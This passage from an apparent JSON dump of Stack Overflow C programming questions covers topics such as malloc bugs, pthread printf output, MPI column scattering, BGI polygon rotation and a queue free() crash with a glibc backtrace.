point[n]-&gt;pointer[0].y = 2;\n  point[n]-&gt;pointer[7].x = 100;\n}\n\nint main()\n{\n  int numfigs = 1;\n  struct figure * point;\n  point = malloc(sizeof(struct figure) * 16);\n  point = &amp;fig;\n  point[1].coordcount = 1;\n  init_fig(numfigs, &amp;point);\n  return 0;\n}\n</code></pre>\n\n<p>I labelled where the first seg fault occurs, (used ddd). what i dont get is that i can manipulate  point[1] in main but not in any other function.</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13208514,"title":"malloc unable to assign memory + doesnt warn","body":"<pre><code>  char *str=NULL;\n  strsave(s,str,n+1);\n  printf(\"%s\",str-n);\n</code></pre>\n\n<p>when I gdb debug this code I find that the str value is 0x0 which is null and also that my code is not catching this failed memory allocation , it doesnt execute str==NULL perror code ...Any idea</p>\n\n<pre><code> void strsave(char *s,char *str,int n)\n {\n    str=(char *)malloc(sizeof(char)* n);\n            if(str==NULL)\n                    perror(\"failed to allocate memory\");\n    while(*s)\n    {\n            *str++=*s++;\n    }\n            *str='\\0';\n }\n</code></pre>\n"},{"tags":["c","optimization","pointers"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":3,"view_count":143,"score":2,"question_id":13207541,"title":"Pointer address is not incrementing","body":"<p>I have already implemented some of the recommendations before in <a href=\"http://codereview.stackexchange.com/questions/16301/how-to-improved-and-optimized-my-squeeze-function\">Code Review</a>. I also improved my code by using pointers. However, what is wrong with address incrementation part below <code>squeezed_str++</code>? It seems that address is not incrementing. Please advise.</p>\n\n<p>PS. substring() function is working. :)</p>\n\n<pre><code>char *squeeze (char *str, int start_index, int end_index, char *ref_str) {\n     char *substr;\n     substr = malloc (sizeof (*substr));\n     if (substr == NULL) {\n          printf (\"Unable to allocate memory.\\n\");\n          exit (EXIT_FAILURE);\n     }\n\n     char *squeezed_str;\n     squeezed_str = malloc (sizeof (*squeezed_str));\n     if (squeezed_str == NULL) {\n          printf (\"Unable to allocate memory!\\n\");\n          exit (EXIT_FAILURE);\n     }\n\n     substr = substring (str, start_index, end_index);\n     int substr_len = strlen (substr);\n     int refstr_len = strlen (ref_str);\n\n     char chr1, chr2; chr1 = chr2 = '\\0';\n\n     for (int i = 0; i &lt; substr_len; i++) {\n          chr1 = *(substr+i);\n          for (int j = 0; j &lt; refstr_len; j++) {\n               chr2 = *(ref_str + j);\n               if (chr1 == chr2) {\n                    break;\n               }\n          }\n          if (chr1 != chr2) {\n               *squeezed_str = *(substr+i);\n               squeezed_str++;\n          }     \n     }\n\n     return squeezed_str;\n } /* end of squeeze() */\n</code></pre>\n"},{"tags":["c","pointers","heap","variable-assignment"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":75,"score":3,"question_id":13199335,"title":"Can someone explain what are strong updates and give an example which illustrates it?","body":"<p>I'm reading the <a href=\"http://suif.stanford.edu/papers/wilson95/subsection3_4_1.html#SECTION0004100000000000000\" rel=\"nofollow\">Strong Update</a> section of a paper on <em>Efficient Context-Sensitive Pointer Analysis for C Programs</em> and I'm not able to grasp exactly what it means. Can someone provide an example, especially for this line in the link:</p>\n\n<blockquote>\n  <p>This greatly improves our ability to perform strong updates. Since a heap block represents all the storage allocated in a particular context, we assume that locally allocated heap blocks are never unique.</p>\n</blockquote>\n"},{"tags":["c","solaris"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13198272,"title":"error: expected primary-expression before \"__attribute__\";","body":"<p>I am compiling a C program on Solaris 10 for x86, this is a part linked:</p>\n\n<pre><code>&gt;yyerrlab1:/*Suppress GCC warning that yyerrlab1 is unused when no action*/\n&gt;#if defined (__GNUC_MINOR__)&amp;&amp;2093&lt;=(__GNUC__*1000+__GNUC_MINOR__) \n&gt; __attribute__((__unused__))\n&gt;#endif\n&gt;goto yyerrlab2;\n</code></pre>\n\n<p>The code is written in a file named yacc.y.\nWhen I compile the program by makefile, the result comes out to be:</p>\n\n<pre><code>&gt;bison -d -p syn yacc.y\n&gt;yacc.y:conflicts:7shifts/reduce\n&gt;mv yacc.tab.h yacc.h\n&gt;mv yacc.tab.c yacc.c\n&gt;yacc.tab.c: in function 'int synparse()';\n&gt;yacc.tab.c:1543:error:expected primary-expression before \"__attribute__\"\n&gt;yacc.tab.c:1543:error:expected \";\" before \"__attribute__\"\n</code></pre>\n\n<p>What's wrong with the code?And how can I fix it?</p>\n"},{"tags":["c","network-programming","ethernet"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":62,"score":2,"question_id":13166094,"title":"Build vlan header in c","body":"<p>I need to build a vlan header.\nI have code that build eh header  (struct ether_header) and it work ok.</p>\n\n<pre><code>/* Ethernet header */\nmemcpy(eh-&gt;ether_shost,src_mac_.data(), 6);\nmemcpy(eh-&gt;ether_dhost,socketAddress.sll_addr , 6);\n\n/* Ethertype field */\neh-&gt;ether_type = htons(ETH_P_IP);\n</code></pre>\n\n<p>I didnt find struct for vlan_eth_header , so i create my own and populate it like this:</p>\n\n<pre><code>struct vlan_ethhdr {\n  u_int8_t  ether_dhost[ETH_ALEN];  /* destination eth addr */\n  u_int8_t  ether_shost[ETH_ALEN];  /* source ether addr    */\n  u_int16_t          h_vlan_proto;\n  u_int16_t          h_vlan_TCI;\n  u_int16_t ether_type;\n };\n\n    /* Ethernet header */\n    memcpy(eh-&gt;ether_shost,src_mac_.data(), 6);\n    memcpy(eh-&gt;ether_dhost,socketAddress.sll_addr , 6);\n        eh-&gt;h_vlan_proto = htons(0x8100);\n        eh-&gt;h_vlan_TCI = htons(VLAN_ID);\n    /* Ethertype field */\n    eh-&gt;ether_type = htons(ETH_P_IP);\n</code></pre>\n\n<p>It seems that i did it wrong.\nIt seems that Wireshak even didnt recognize the packet (the old code sent tcp packet and send them correct).\nAny advice?</p>\n"},{"tags":["c++","c","string","algorithm","permutation"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":2,"view_count":116,"score":1,"question_id":13207857,"title":"All Permutations of a string when corresponding characters are not in the same place","body":"<p>I need all possible permutations of a given string such that no character should remain at the same place as in the input string.\nEg. : for input \"ask\"\nOutput: all possible permutaions like \"ksa\", \"kas\"... \nsuch that 'a' is not in the 1st position , 's' is not in the 2nd positions and so on... in any permutation.</p>\n\n<p><strong>I only need the count of such possible permutations</strong></p>\n\n<p>I can do this by generating all permutations and filtering them but I need a <strong>very efficient</strong> way of doing this.</p>\n\n<p>All characters in the string are \"UNIQUE\"</p>\n\n<p>Preferred language C++.</p>\n"},{"tags":["c","pointers"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":961,"score":5,"question_id":7553750,"title":"What is an Opaque pointer in C?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3854113/what-is-an-opaque-value\">What is an opaque value?</a>  </p>\n</blockquote>\n\n\n\n<p>May I know the usage and logics behind the Opaque pointer concept in C?</p>\n\n<p>/R</p>\n"},{"tags":["c","c99","c89"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":13208287,"title":"Remainder operator in c89 and c99","body":"<p><strong>c99</strong> standard says that result of modulo operation has same sign as first operand. So <code>-9 % 7 = -2</code> and <code>9 % -7 = 2</code>.</p>\n\n<p>I read in one book that c89 standard depends on implementation. So <code>-9 % 7</code> could yield <code>-2</code> or <code><strong>5</strong></code>??? How remainder of <code>-9 / 7</code> could be <code>5</code>?</p>\n"},{"tags":["c","graphics"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":220,"score":0,"question_id":10213374,"title":"C - Graphics, Unable to rotate a polygon","body":"<p>In the below program I am trying to rotate the triangle by 45 degree anti-cockwise. The polygon did rotate to some angle and translated to some other place. Please let me know how this can be fixed.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;conio.h&gt;\n#include&lt;graphics.h&gt;\n#include&lt;math.h&gt;\n\nint main(void)\n{\n int poly[8], rpoly[8],angle;\n int gd = DETECT, gm;\n initgraph(&amp;gd,&amp;gm,\"C:\\\\TC\\\\BGI\");\n\n printf(\"\\n Enter co-ordinates for Triangle :  \\n\\n\");\n\n printf(\"Vertex 1 (x,y)  : \");\n scanf(\"%d %d\", &amp;poly[0], &amp;poly[1]);\n printf(\"Vertex 2 (x,y)  : \");\n scanf(\"%d %d\", &amp;poly[2], &amp;poly[3]);\n printf(\"Vertex 3 (x,y)  : \");\n scanf(\"%d %d\", &amp;poly[4], &amp;poly[5]);\n poly[6] = poly[0];\n poly[7] = poly[1];\n\n setcolor(2);\n drawpoly(4,poly);\n\n angle = 45;\n rpoly[0] = poly[0]*cos(angle) - poly[1]*sin(angle);\n rpoly[1] = poly[0]*sin(angle) + poly[1]*cos(angle);\n\n rpoly[2] = poly[2]*cos(angle) - poly[3]*sin(angle);\n rpoly[3] = poly[2]*sin(angle) + poly[3]*cos(angle);\n\n rpoly[4] = poly[4]*cos(angle) - poly[5]*sin(angle);\n rpoly[5] = poly[4]*sin(angle) + poly[5]*cos(angle);\n\n rpoly[6] = rpoly[0];\n rpoly[7] = rpoly[1];\n\n setcolor(4);\n drawpoly(4,rpoly);\n\n getch();\n closegraph();\n return 0;\n}\n</code></pre>\n\n<p>Output: \n<img src=\"http://i.stack.imgur.com/ieuoR.png\" alt=\"enter image description here\"></p>\n\n<p>EDIT 1:</p>\n\n<p>In the Output the Red Triangle (i.e Triangle after Rotation) looks bigger than the original one.</p>\n\n<p>New Code</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;conio.h&gt;\n#include&lt;graphics.h&gt;\n#include&lt;math.h&gt;\n\nint main(void)\n{\n int poly[8], rpoly[8], angle, centroid_x, centroid_y,i;\n int gd = DETECT, gm;\n initgraph(&amp;gd,&amp;gm,\"C:\\\\TC\\\\BGI\");\n\n printf(\"\\n Enter co-ordinates for Triangle :  \\n\\n\");\n\n printf(\"Vertex 1 (x,y)  : \");\n scanf(\"%d %d\", &amp;poly[0], &amp;poly[1]);\n printf(\"Vertex 2 (x,y)  : \");\n scanf(\"%d %d\", &amp;poly[2], &amp;poly[3]);\n printf(\"Vertex 3 (x,y)  : \");\n scanf(\"%d %d\", &amp;poly[4], &amp;poly[5]);\n poly[6] = poly[0];\n poly[7] = poly[1];\n\n setcolor(2);\n drawpoly(4,poly);\n\n angle = 45 * 2 * 3.14 / 360;\n centroid_x =  (poly[0] + poly[2] + poly[4]) / 3;\n centroid_y =  (poly[1] + poly[3] + poly[5]) / 3;\n\n rpoly[0] = (poly[0] - centroid_x) * cos(angle)  -  (poly[1] - centroid_y) * sin(angle)  +  centroid_x;\n rpoly[1] = (poly[0] - centroid_x) * sin(angle)  -  (poly[1] - centroid_y) * cos(angle)  +  centroid_y;\n\n rpoly[2] = (poly[2] - centroid_x) * cos(angle)  -  (poly[3] - centroid_y) * sin(angle)  +  centroid_x;\n rpoly[3] = (poly[2] - centroid_x) * sin(angle)  -  (poly[3] - centroid_y) * cos(angle)  +  centroid_y;\n\n rpoly[4] = (poly[4] - centroid_x) * cos(angle)  -  (poly[5] - centroid_y) * sin(angle)  +  centroid_x;\n rpoly[5] = (poly[4] - centroid_x) * sin(angle)  -  (poly[5] - centroid_y) * cos(angle)  +  centroid_y;\n\n rpoly[6] = rpoly[0];\n rpoly[7] = rpoly[1];\n\n setcolor(4);\n drawpoly(4,rpoly);\n\n for(i=0;i&lt;7;i++)\n {printf(\"\\n %d\", &amp;rpoly[i]);}\n\n getch();\n closegraph();\n return 0;\n}\n</code></pre>\n\n<p>OutPut:\n<img src=\"http://i.stack.imgur.com/yhRc3.png\" alt=\"enter image description here\"></p>\n\n<p>EDIT 2:</p>\n\n<p>Code after correcting the Y - terms:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;conio.h&gt;\n#include&lt;graphics.h&gt;\n#include&lt;math.h&gt;\n\nint main(void)\n{\n int poly[8], rpoly[8], angle, centroid_x, centroid_y,i;\n int gd = DETECT, gm;\n initgraph(&amp;gd,&amp;gm,\"C:\\\\TC\\\\BGI\");\n\n printf(\"\\n Enter co-ordinates for Triangle :  \\n\\n\");\n\n printf(\"Vertex 1 (x,y)  : \");\n scanf(\"%d %d\", &amp;poly[0], &amp;poly[1]);\n printf(\"Vertex 2 (x,y)  : \");\n scanf(\"%d %d\", &amp;poly[2], &amp;poly[3]);\n printf(\"Vertex 3 (x,y)  : \");\n scanf(\"%d %d\", &amp;poly[4], &amp;poly[5]);\n poly[6] = poly[0];\n poly[7] = poly[1];\n\n setcolor(2);\n drawpoly(4,poly);\n\n angle = 45 * 2 * 3.14 / 360;\n centroid_x =  (poly[0] + poly[2] + poly[4]) / 3;\n centroid_y =  (poly[1] + poly[3] + poly[5]) / 3;\n\n rpoly[0] = (poly[0] - centroid_x) * cos(angle)  -  (poly[1] - centroid_y) * sin(angle)  +  centroid_x;\n rpoly[1] = (poly[0] - centroid_x) * sin(angle)  +  (poly[1] - centroid_y) * cos(angle)  +  centroid_y;\n\n rpoly[2] = (poly[2] - centroid_x) * cos(angle)  -  (poly[3] - centroid_y) * sin(angle)  +  centroid_x;\n rpoly[3] = (poly[2] - centroid_x) * sin(angle)  +  (poly[3] - centroid_y) * cos(angle)  +  centroid_y;\n\n rpoly[4] = (poly[4] - centroid_x) * cos(angle)  -  (poly[5] - centroid_y) * sin(angle)  +  centroid_x;\n rpoly[5] = (poly[4] - centroid_x) * sin(angle)  +  (poly[5] - centroid_y) * cos(angle)  +  centroid_y;\n\n rpoly[6] = rpoly[0];\n rpoly[7] = rpoly[1];\n\n setcolor(4);\n drawpoly(4,rpoly);\n\n// for(i=0;i&lt;8;i++)\n// {printf(\"\\n %d\", &amp;rpoly[i]);}\n\n getch();\n closegraph();\n return 0;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<p><img src=\"http://i.stack.imgur.com/iRNqP.png\" alt=\"enter image description here\"></p>\n"},{"tags":["c","emacs","compilation","clang","eshell"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":72,"score":3,"question_id":13202192,"title":"Compiling Programs from Within Emacs?","body":"<p>What is the best way to compile programs inside emacs? I am currently opening a separate buffer with <code>C-x 3</code> and running eshell inside it using <code>M-x eshell</code> then invoking either make or clang directly; most of the time I do have a Makefile set up.</p>\n\n<p>Is there any advantage with running the compilation process using <code>M-x compile</code> vs running make inside eshell? Any other ways to do it and what are the advantages/disadvantages of those?</p>\n"},{"tags":["c","pthreads","printf"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":96,"score":1,"question_id":13190254,"title":"weird output when I use pthread and printf","body":"<p>I'm not native in English, so there are some grammatic error or lack of expression.\nI'm sorry for that, but please be tolerate.</p>\n\n<p>I write a program using pthread.</p>\n\n<p>Environment:windows 7 , CYGWIN_NT-6.1 i686 Cygwin , gcc (GCC) 4.5.3</p>\n\n<p>The source code</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;pthread.h&gt;\n\nvoid *th_func(void *p)\n{\n    int iLoop = 0;\n\n    for(iLoop = 0;iLoop&lt;100;iLoop++)\n    {\n        printf(\"Thread Thread Thread Thread\\n\");\n    }\n\n    return;\n}\n\nint main()\n{\n    int iLoop = 0;\n    pthread_t QueThread;\n\n    printf(\"Main : Start Main\\n\");\n\n    printf(\"Main : Start Create Thread\\n\");\n    pthread_create(&amp;QueThread,NULL,th_func,NULL);\n    printf(\"Main : End Create Thread\\n\");\n\n    for(iLoop = 0;iLoop&lt;100;iLoop++)\n    {\n        printf(\"Main Main Main Main\\n\");\n    }\n\n    pthread_join(QueThread,NULL);\n\n    printf(\"Main : End Main\\n\");\n\n    printf(\"---------------\\n\");\n\n    return 0;\n}\n</code></pre>\n\n<p>When I compile the source code, there are no warnings or errors,but it's output is weird.</p>\n\n<p>A part of it's output</p>\n\n<pre><code>Main : Start Main\nMain : Start Create Thread\nThread Thread Thread ThreThread Thread Thread Thread\nMain Main Main Main\nThread Thread Thread Thread\nMain Main Main Main\n</code></pre>\n\n<p>I want to know the cause of such phenomenon.</p>\n\n<p>In this output,\"Main : End Create Thread\" is not printed completely.And at line 3,a newline\"\\n\" at the end of \"Thread Thread Thread Thread\\n\"disappear.</p>\n\n<p>Is everyone output like this?\nIt does not occur everytime,but occurs sometime.</p>\n\n<p>If I use mutex to call printf safely,the weird output seem to be stopped.</p>\n\n<p>Posix says printf is thread-safe,and according to Cygwin.com,cygwin provides posix-style API. However, there is unexpected output. </p>\n\n<p>Is printf really thread-safe?\nDoes anyone know anything about it?</p>\n\n<p>11/3 I'm sorry for my delayed response.</p>\n\n<p>I executed the same program 100 times in Linux(Ubuntu), and this output did not occur..</p>\n"},{"tags":["c","homework","mpi"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":183,"score":2,"question_id":10788180,"title":"Sending columns of a matrix using MPI_Scatter","body":"<p>I'm trying to write a matrix-vector multiplication program using MPI. I'm trying to send columns of the matrix to separate processes and locally calculate the result. In the end I do a <code>MPI_Reduce</code> using <code>MPI_SUM</code> operation.</p>\n\n<p>Sending rows of a matrix is easy as C stores arrays in row-major order, but columns is not (if you don't send them one by one). I read the question here:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/5512245/mpi-scatter-sending-columns-of-2d-array\">MPI_Scatter - sending columns of 2D array</a></p>\n\n<p>Jonathan Dursi suggested using new MPI datatypes and here's what I've done by adapting his code to my own needs:</p>\n\n<pre><code>  double matrix[10][10];\n  double mytype[10][10];\n  int part_size; // stores how many cols a process needs to work on\n  MPI_Datatype col, coltype;\n  // ...\n  MPI_Type_vector(N, 1, N, MPI_DOUBLE, &amp;col);\n  MPI_Type_commit(&amp;col);\n  MPI_Type_create_resized(col, 0, 1*sizeof(double), &amp;coltype);\n  MPI_Type_commit(&amp;coltype);\n  // ...\n  MPI_Scatter(matrix, part_size, coltype,\n              mypart, part_size, coltype,\n              0, MPI_COMM_WORLD);\n\n  // calculations...\n  MPI_Reduce(local_result, global_result,\n             N, MPI_DOUBLE,\n             MPI_SUM,\n             0, MPI_COMM_WORLD);\n</code></pre>\n\n<p>This works perfectly, but I can't say I really understand how it works.</p>\n\n<ol>\n<li>How is <code>MPI_Type_vector</code> stored in the memory?</li>\n<li>How does <code>MPI_Type_create_resized()</code> work and what does it exactly do?</li>\n</ol>\n\n<p>Please bear in mind that I'm a total beginner in MPI. Thanks in advance.</p>\n"},{"tags":["c","hashmap","hashtable"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":13208229,"title":"A simple hash function for a grid","body":"<p>I have a 3d grid with a known size N^3. In this grid I have a collection of M grid points (i,j,k) (I know that these points constitute a contiguous shape if that is any help). I need to map the different (i,j,k)-tuples of the collection to a sequence of M numbers from 0 to M-1 corresponding to array indices (since I need to calculate some data for these grid points). In essence I need a bijection on my set of (i,j,k)'s to the numbers 0 to M-1. How could I make such a hash function?</p>\n\n<p>As an example: Consider a 4x4 2D grid. For each grid point I can associate a hash key by key=4*i+j (the standard way to consider a 2d array as a 1d array in row-major order). If I need the points (0,0), (0,1), (0,2) and (1,1) this would give the keys 0, 1, 2 and 5, so the keys can't represent array indices since they would need to go from 0-4 in that case, and thus this hash function is not suited.</p>\n"},{"tags":["c","sockets","cgi","daemon","mmap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":13208178,"title":"Socket or shared memory?","body":"<p>I need some advice:</p>\n\n<p>I'm coding a C CGI under Apache, each time the program is executed it must read +- 10000 pairs of key-values stored in a file, I don't want to read the file on every call then I need to have some daemon appart providing this pairs, what's the best method to do this (excuse my poor english)</p>\n"},{"tags":["c++","c","visual-c++"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":13206519,"title":"Visual Studio 2010 settings","body":"<p>I am trying to compile a C++ project in Visual Studio 2010.\nIt contains many C++ files and it also has a couple of C files.</p>\n\n<p>Because it is a C++ project and the warning level is set to /W4 I am getting a lot of warnings on the C source code.</p>\n\n<p>Is there a way to select the C compiler for C source code and the C++ compiler for C++ source code?</p>\n"},{"tags":["c","bash","histogram"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":13121052,"title":"Statistically collecting rounding error in a program (C)","body":"<p>I wrote a program that compute 1000000! using FFT.</p>\n\n<p>(please allow me to be short and omit some theoretical resoning :) )</p>\n\n<p>What i want to do is measure ALL the rounding error between a double value and is <code>round()</code>-ed value (using <code>math.h</code> function) to check how this error is behaving (and if it is above 1/2).</p>\n\n<p>I'm doing so by printing the difference between <code>a</code> and <code>round(a)</code> each time i do rounding, and write the result into a file, let's call it <code>diffs.txt</code>, which is <code>~532Mb</code>, using</p>\n\n<p><code>fprintf(my_file,\"%e\\n\",a-round(a));</code></p>\n\n<p>I now need to count the occurrence of every single value that appear in that file.</p>\n\n<p>I'm doing so by what it seems to me an intricate way, using <code>grep</code>, <code>sort</code> and a bash <code>for</code> as follow:</p>\n\n<pre><code>./compute-rounding-err #It creates diffs.txt\nsort -u diffs.txt -o diff-sorted-unique\nfor i in `cat diff-sorted-unique`\ndo\n grep -e \"$i\" | wc -l &gt;&gt; diff-counted\ndone\n</code></pre>\n\n<p>The result is two file. If i pair that files i obtain</p>\n\n<pre><code>diff-sorted-unique:     diff_counted:\n-9.013892e-20           1           \n...                     ...\n0.000000e0              200\n...                     ...\n9.930234e               1\n</code></pre>\n\n<p>I can take these values and make an histogram out of them.</p>\n\n<p>My fear is that doing so on a laptop with a <code>~532Mb</code> file will take a long time.</p>\n\n<p>Anyone knows how to speed things up?</p>\n\n<p>Thanks.</p>\n"},{"tags":["c","volatile"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":89,"score":5,"question_id":13207077,"title":"Example C code that demonstrates volatile in disassembly?","body":"<p>What is a short illustrative C program that demonstrates the difference between volatile and non-volatile in the disassembly?</p>\n\n<p>ie</p>\n\n<pre><code>int main()\n{\n    volatile int x;\n\n    ???\n}\n</code></pre>\n\n<p>vs</p>\n\n<pre><code>int main()\n{\n    int x;\n\n    ???\n}\n</code></pre>\n\n<p>What can we replace both <code>???</code> with such that the generated code is different?</p>\n"},{"tags":["c","struct","free","dynamic-memory-allocation"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13206714,"title":"C error - free(): invalid next size (fast)","body":"<p>I am not sure why I am getting the below error. Strangely enough, this error doesn't occur when I use Mac OS X, but it does when I use my Linux (Debian) partition.</p>\n\n<pre><code>-----------\nEmpty Queue: 0 0 0 0 0 0 0 0 0 0 \n\n---------------\nPopulated Queue: 5 3 1 7 6 3 2 1 4 4 \n\n-------------\nAfter Dequeue: 3 1 7 6 3 2 1 4 4 0 \n    Datum: 5\n\n*** glibc detected *** ./queue_demo: free(): invalid next size (fast): 0x0000000000c73010 ***\n======= Backtrace: =========\n/lib/x86_64-linux-gnu/libc.so.6(+0x75b76)[0x7fde5c98db76]\n/lib/x86_64-linux-gnu/libc.so.6(cfree+0x6c)[0x7fde5c9928ac]\n./queue_demo[0x40098d]\n./queue_demo[0x4008d8]\n/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xfd)[0x7fde5c936ead]\n./queue_demo[0x4006d9]\n======= Memory map: ========\n00400000-00401000 r-xp 00000000 08:01 940937                             /home/dylan/Desktop/CST352_Gleason_Lab2/solution_1/queue_demo\n00601000-00602000 rw-p 00001000 08:01 940937                             /home/dylan/Desktop/CST352_Gleason_Lab2/solution_1/queue_demo\n00c73000-00c94000 rw-p 00000000 00:00 0                                  [heap]\n7fde58000000-7fde58021000 rw-p 00000000 00:00 0 \n7fde58021000-7fde5c000000 ---p 00000000 00:00 0 \n7fde5c702000-7fde5c717000 r-xp 00000000 08:01 1079347                    /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fde5c717000-7fde5c917000 ---p 00015000 08:01 1079347                    /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fde5c917000-7fde5c918000 rw-p 00015000 08:01 1079347                    /lib/x86_64-linux-gnu/libgcc_s.so.1\n7fde5c918000-7fde5ca95000 r-xp 00000000 08:01 1079316                    /lib/x86_64-linux-gnu/libc-2.13.so\n7fde5ca95000-7fde5cc95000 ---p 0017d000 08:01 1079316                    /lib/x86_64-linux-gnu/libc-2.13.so\n7fde5cc95000-7fde5cc99000 r--p 0017d000 08:01 1079316                    /lib/x86_64-linux-gnu/libc-2.13.so\n7fde5cc99000-7fde5cc9a000 rw-p 00181000 08:01 1079316                    /lib/x86_64-linux-gnu/libc-2.13.so\n7fde5cc9a000-7fde5cc9f000 rw-p 00000000 00:00 0 \n7fde5cc9f000-7fde5ccbf000 r-xp 00000000 08:01 1079447                    /lib/x86_64-linux-gnu/ld-2.13.so\n7fde5cea3000-7fde5cea6000 rw-p 00000000 00:00 0 \n7fde5cebb000-7fde5cebe000 rw-p 00000000 00:00 0 \n7fde5cebe000-7fde5cebf000 r--p 0001f000 08:01 1079447                    /lib/x86_64-linux-gnu/ld-2.13.so\n7fde5cebf000-7fde5cec0000 rw-p 00020000 08:01 1079447                    /lib/x86_64-linux-gnu/ld-2.13.so\n7fde5cec0000-7fde5cec1000 rw-p 00000000 00:00 0 \n7fff13797000-7fff137b8000 rw-p 00000000 00:00 0                          [stack]\n7fff137ff000-7fff13800000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\nAborted\n</code></pre>\n\n<p>This error happens when I call the <code>destruct</code> function in my Queue structure, in a test program written below.</p>\n\n<pre><code>#include &lt;time.h&gt;\n#include &lt;stdio.h&gt;\n#include \"Queue.h\"\n\nint main(int argc, char* argv[])\n{\n   // create a \"queue\" data structure\n   Queue_t* my_queue = construct(10);\n\n   // generate a random seed\n   srand( (unsigned)time(NULL) );\n\n   // display the empty queue\n   printf(\"-----------\\n\");\n   printf(\"Empty Queue: \");\n   display(my_queue);\n   printf(\"\\n\");\n\n   // populate the queue with random numbers\n   int i = 0;\n\n   for(; i &lt; my_queue-&gt;maximum_count; ++i)\n      enqueue(my_queue, rand() % 10);\n\n   printf(\"---------------\\n\");\n   printf(\"Populated Queue: \");\n   display(my_queue);\n   printf(\"\\n\");\n\n   // dequeue, print the current queue and the datum\n   int datum = dequeue(my_queue);\n\n   printf(\"-------------\\n\");\n   printf(\"After Dequeue: \");\n   display(my_queue);\n   printf(\"\\tDatum: %d\\n\\n\", datum);\n\n   // clean up memory\n   destruct(my_queue);\n\n   return 0;\n}\n</code></pre>\n\n<p>Here is my data structure:</p>\n\n<pre><code>#ifndef QUEUE_H\n#define QUEUE_H\n\ntypedef struct Queue\n{\n   int  current_count;\n   int  maximum_count;\n   int  buffer[];       // queue uses an array\n} Queue_t;\n\n\n// routines to implement Queue-like functionality (FIFO)\n// TODO: somehow encapsulate all these features in the struct itself.\n//\nQueue_t* construct(int buff_size);\nvoid     destruct (Queue_t* queue);\nvoid     display  (Queue_t* queue);\nint      dequeue  (Queue_t* queue);\nvoid     enqueue  (Queue_t* queue, const int datum);\n\n#endif\n</code></pre>\n\n<p>Implementation:</p>\n\n<pre><code>#include &lt;assert.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include \"Queue.h\"\n\nQueue_t* construct(int buff_size)\n{\n   Queue_t* queue = malloc(\n      sizeof(Queue_t) + sizeof(int) * sizeof(Queue_t));\n\n   assert(queue != NULL);\n   queue-&gt;maximum_count = buff_size;\n   queue-&gt;current_count = 0;\n   memset(queue-&gt;buffer, 0, sizeof(int)*buff_size);\n\n   return queue;\n}\n\nvoid destruct(Queue_t* queue)\n{\n   assert(queue != NULL);\n   free(queue);  // error at this statement\n   printf(\"Queue destroyed!\\n\");\n}\n\nvoid display(Queue_t* queue)\n{\n   int i = 0;\n\n   for(; i &lt; queue-&gt;maximum_count; ++i)\n      printf(\"%d \", queue-&gt;buffer[i]);\n   printf(\"\\n\");\n}\n\nvoid enqueue(Queue_t* queue, const int datum)\n{\n   assert(queue-&gt;current_count &lt; queue-&gt;maximum_count);\n   queue-&gt;buffer[queue-&gt;current_count] = datum;\n   ++queue-&gt;current_count;\n}\n\n\nint dequeue(Queue_t* queue)\n{\n   int i = 1;\n   int datum = queue-&gt;buffer[0];\n\n   assert(queue-&gt;current_count &gt; 0);\n\n   for(; i &lt; queue-&gt;maximum_count; ++i)\n   {\n      queue-&gt;buffer[i-1] = queue-&gt;buffer[i];\n      queue-&gt;buffer[i] = 0;\n   }\n\n   --queue-&gt;current_count;\n\n   return datum;\n}\n</code></pre>\n"},{"tags":["c","containers","idioms","void-pointers","generic-programming"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":122,"score":5,"question_id":10369976,"title":"In C, Generic Containers or Safe Containers?","body":"<p>In C++ you can have both generic and type safe containers by using templates. However in C, if you want generic containers, you have to (afaik) use <code>void*</code>, which means you lose type safety. To have type safe containers, you would have to reimplement them for every type of data you want to hold.</p>\n\n<p>Given that C follows a more <em>the-programmer-knows-what-he's-doing</em> philosophy than C++, what would be the more idiomatic thing to do in C: use generic containers with <code>void*</code>, or make custom containers for every type of data?</p>\n"},{"tags":["c","file-io","include","system","file-handling"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13206623,"title":"How to remove errors in getmac program in C 